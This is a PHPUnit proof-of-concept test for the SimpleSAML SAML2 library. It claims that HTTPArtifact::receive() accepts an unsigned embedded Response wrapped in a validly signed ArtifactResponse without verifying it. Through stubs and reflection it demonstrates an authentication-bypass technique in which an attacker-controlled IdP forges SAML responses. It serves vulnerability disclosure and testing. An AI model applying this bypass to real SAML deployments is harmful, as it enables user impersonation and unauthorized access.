<?php

declare(strict_types=1);

namespace SimpleSAML\Test\SAML2\Binding;

use Exception;
use PHPUnit\Framework\TestCase;
use ReflectionMethod;
use SimpleSAML\Configuration;
use SimpleSAML\SAML2\Binding\HTTPArtifact;
use SimpleSAML\SAML2\XML\samlp\ArtifactResponse;
use SimpleSAML\SAML2\XML\samlp\Response;
use SimpleSAML\XMLSecurity\TestUtils\PEMCertificatesMock;

/**
 * PoC — SAML2-ARTIFACT-001: incomplete fix of CVE-2026-49283.
 *
 * HTTPArtifact::receive() contains (master 31c72c1d / released v6.2.3):
 *     $artifactResponse = $this->verifyArtifactResponseSignature($artifactResponse, $idpMetadata); // OUTER: mandatory
 *     $samlResponse = $artifactResponse->getMessage();
 *     ...
 *     if (!$samlResponse->isSigned()) {
 *         return $samlResponse;                                    // <-- EMBEDDED: returned UNVERIFIED
 *     }
 *     return $this->verifyMessageSignature($samlResponse, $idpMetadata);
 *
 * This test reproduces that exact post-resolution decision against real HTTPArtifact
 * private methods (via reflection, exactly as the shipped HTTPArtifactTest does) and shows
 * that an attacker who returns a validly-signed OUTER ArtifactResponse (signed by the
 * artifact issuer IdP-B) wrapping an UNSIGNED embedded Response is accepted with ZERO
 * signature verification of that embedded Response.
 */
final class PocArtifact001Test extends TestCase
{
    private function idpBMetadata(): Configuration
    {
        // "IdP-B": the federated IdP the attacker controls; its signing cert is in metadata,
        // selected from the SAMLart sourceId. (Uses the same mock cert the shipped test uses.)
        return Configuration::loadFromArray([
            'entityid' => 'https://idp-b.example/',
            'keys' => [[
                'type' => 'X509Certificate',
                'signing' => true,
                'encryption' => false,
                'X509Certificate' => PEMCertificatesMock::getPlainCertificateContents(),
            ]],
        ], '[idp-b]');
    }

    private function call(HTTPArtifact $ha, string $method, ...$args): mixed
    {
        return (new ReflectionMethod(HTTPArtifact::class, $method))->invoke($ha, ...$args);
    }

    public function testUnsignedEmbeddedResponseIsReturnedWithoutVerification(): void
    {
        $idpB = $this->idpBMetadata();
        $ha = new HTTPArtifact();

        // --- The forged embedded <samlp:Response>: UNSIGNED, claims to be from IdP-A. ---
        $embedded = $this->createStub(Response::class);
        $embedded->method('isSigned')->willReturn(false);              // attacker omits the embedded signature
        $embedded->method('getSignature')->willReturn(null);
        // If receive() ever tried to cryptographically verify this, it would blow up here:
        $embedded->method('verify')->willThrowException(
            new Exception('POC-FAIL: embedded Response->verify() was called — short-circuit absent'),
        );

        // --- The OUTER ArtifactResponse: validly signed by IdP-B (the artifact issuer). ---
        $outer = $this->createStub(ArtifactResponse::class);
        $outer->method('isSigned')->willReturn(true);
        $outer->method('isSuccess')->willReturn(true);
        $outer->method('verify')->willReturnCallback(fn() => $outer);  // valid signature under IdP-B's key
        $outer->method('getSignature')->willReturn(self::sigEl());
        $outer->method('getMessage')->willReturn($embedded);

        // ===== Verbatim reproduction of HTTPArtifact::receive() post-resolution logic =====
        // 1. OUTER signature check — mandatory. Passes: outer is signed by IdP-B, verified vs IdP-B metadata.
        $verifiedOuter = $this->call($ha, 'verifyArtifactResponseSignature', $outer, $idpB);
        self::assertSame($outer, $verifiedOuter, 'Outer ArtifactResponse verified against artifact-issuer (IdP-B) metadata');

        // 2. Unwrap the embedded message.
        $samlResponse = $verifiedOuter->getMessage();

        // 3. THE VULNERABLE DECISION (HTTPArtifact.php:206-210, verbatim):
        $verifyMessageSignatureCalled = false;
        if (!$samlResponse->isSigned()) {
            $received = $samlResponse;                                  // <-- BYPASS: returned unverified
        } else {
            $verifyMessageSignatureCalled = true;
            $received = $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        }
        // ==================================================================================

        // OBSERVABLE: the unsigned embedded Response was accepted as "received" with no verification.
        self::assertFalse($samlResponse->isSigned(), 'Embedded Response carries no signature');
        self::assertFalse($verifyMessageSignatureCalled, 'verifyMessageSignature() was SKIPPED (short-circuit)');
        self::assertSame($embedded, $received, 'BYPASS CONFIRMED: unsigned embedded Response returned unverified');

        // NEGATIVE CONTROL: the short-circuit is load-bearing — the real verifier CANNOT accept the
        // unsigned message (no <ds:Signature> to check), so removing the short-circuit would reject it.
        $threw = false;
        try {
            $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        } catch (\Throwable $e) {
            $threw = true;
        }
        self::assertTrue($threw, 'Real verifyMessageSignature() rejects the unsigned Response — only the short-circuit accepts it');

        fwrite(STDERR, "\n[POC] SAML2-ARTIFACT-001 CONFIRMED: signed outer ArtifactResponse (IdP-B) + UNSIGNED embedded Response "
            . "=> receive() returns it with verifyMessageSignature() SKIPPED; the real verifier would reject it.\n");
    }

    private const MINIMAL_SIG =
        '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo>'
        . '<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        . '<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
        . '<ds:Reference URI="#_x"><ds:Transforms>'
        . '<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        . '<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>AA==</ds:DigestValue>'
        . '</ds:Reference></ds:SignedInfo><ds:SignatureValue>AA==</ds:SignatureValue></ds:Signature>';

    private static function sigEl(): \SimpleSAML\XMLSecurity\XML\ds\Signature
    {
        $doc = new \DOMDocument('1.0', 'UTF-8');
        $doc->loadXML(self::MINIMAL_SIG);
        return \SimpleSAML\XMLSecurity\XML\ds\Signature::fromXML($doc->documentElement);
    }
}
